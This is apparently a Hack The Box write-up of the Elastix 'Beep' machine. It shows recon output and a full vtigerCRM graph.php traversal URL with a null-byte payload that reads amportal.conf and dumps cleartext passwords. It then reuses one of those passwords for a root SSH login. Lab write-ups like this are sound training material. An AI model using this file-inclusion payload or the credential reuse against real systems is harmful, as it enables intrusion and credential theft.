---
title: Beep
summary: Hack The Box Linux machine running Elastix, owned through the vtigercrm graph.php local file inclusion to read amportal.conf, then password reuse straight to a root SSH shell.
date: 2026-10-21
tags: [Hack The Box, Elastix, LFI, Password Reuse, FreePBX]
difficulty: easy
os: Linux
url: https://app.hackthebox.com/machines/Beep
---

# CTF Room: Beep
- [Link to machine](https://app.hackthebox.com/machines/Beep)
- **Difficulty:** Easy
- **Category:** LFI / Password Reuse
- **OS:** Linux

## 1. Brief
Beep runs Elastix, an old VoIP/PBX distro built on FreePBX and Asterisk. Everyone reaches for the FreePBX RCE (CVE-2012-4869) on this box, but every version of that script I tried threw errors. I did not need it. Elastix 2.2.0 ships a local file inclusion in its bundled vtigerCRM, and that lets me read `amportal.conf`, which hands over a pile of passwords. The box reuses one of them for root, so the LFI plus a bit of password reuse is the whole machine, no exploit script required.

---

## 2. Recon

### NMAP Scan
Quick port scan first.

```bash
nmap beep.htb
```
```text
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4445/tcp  open  upnotifyp
10000/tcp open  snet-sensor-mgmt
```

A lot of ports: mail (SMTP/POP3/IMAP and their TLS variants), web on 80/443, MySQL, and Webmin on 10000. The mail stack plus a web admin screams of a prepackaged appliance rather than something hand-built. Now version and script detection.

```bash
nmap -sCV beep.htb
```
```text
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
80/tcp    open  http       Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://beep.htb/
|_http-server-header: Apache/2.2.3 (CentOS)
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
```

Everything is ancient: OpenSSH 4.3, Apache 2.2.3 on CentOS, Webmin 1.570. Port 80 redirects to HTTPS. Browsing to `https://beep.htb/` lands on an **Elastix** login page, which is the key fact: Elastix is a unified comms distro wrapping FreePBX, Asterisk and vtigerCRM, and the version here is old enough to be riddled with public bugs.

### searchsploit
I took "elastix" straight to the local exploit database.

```bash
searchsploit elastix
```
```text
Elastix 2.2.0 - 'graph.php' Local File Inclusion            | php/webapps/37637.pl
Elastix < 2.5 - PHP Code Injection                          | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution      | php/webapps/18650.py
```

The headline result is the FreePBX RCE (CVE-2012-4869, `18650.py`). It is the route most writeups take, but every copy of that script I ran errored out, so I set it aside and went for the quieter option: the `graph.php` local file inclusion.

---

## 3. Foothold - Elastix graph.php LFI

Elastix bundles vtigerCRM, and its `graph.php` takes a `current_language` parameter that it feeds straight into a file include with no sanitising. A `../` traversal plus a null byte (`%00`) to cut off any appended extension lets me read any file the web server can reach.

The one file worth reading is `amportal.conf`, the FreePBX master config, which holds every service password in cleartext.

```text
https://beep.htb//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

The response dumps the config. Trimming to the useful lines:

```text
AMPDBUSER=asteriskuser
AMPDBPASS=||jEhdIekWmdjE||
AMPMGRUSER=admin
AMPMGRPASS=||jEhdIekWmdjE||
FOPPASSWORD=||jEhdIekWmdjE||
ARI_ADMIN_USERNAME=admin
ARI_ADMIN_PASSWORD=||jEhdIekWmdjE||
```

Every password in the file is the same string, `||jEhdIekWmdjE||`. When an admin reuses one password across the database, the manager interface, FOP and ARI, the obvious next question is whether they reused it for the system accounts too.

---

## 4. Privilege Escalation - Password Reuse to root

There is no lateral step to make here. I just tried that password for `root` over SSH directly.

The SSH daemon is ancient (OpenSSH 4.3), so a modern client refuses its key exchange and host key types. I had to re-enable the legacy algorithms to connect.

```bash
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa root@beep.htb
```
```text
root@beep.htb's password: jEhdIekWmdjE
Last login: Wed Nov 15 12:55:38 2023

Welcome to Elastix
----------------------------------------------------
[root@beep ~]#
```

The reused password works for `root`, so I land in a root shell straight away. Both flags are readable from here.

```bash
cat /home/fanis/user.txt
cat /root/root.txt
```

---

## 5. Flags / Proof

| Flag | Value |
|:--|:--|
| User flag | `||<paste first half, star the rest>||` |
| Root flag | `||<paste first half, star the rest>||` |

---

## 6. Summary
Beep is a box that rewards reading the config over firing an exploit.

- **Elastix is the whole story.** The HTTPS login page identifies the distro, and `searchsploit elastix` lays out the options.
- **LFI over RCE.** The famous FreePBX RCE (CVE-2012-4869) is a distraction when the scripts misbehave. The vtigerCRM `graph.php` LFI, with a `../` traversal and a `%00` null byte, reads `amportal.conf` with no exploit code at all.
- **Password reuse finishes it.** Every password in `amportal.conf` is identical, and the same string is reused for `root`. One `ssh` login, with the legacy KEX and host-key options for the ancient daemon, drops a root shell with both flags.

**Tools used:** `nmap`, `searchsploit`, a browser (for the LFI), `ssh`.
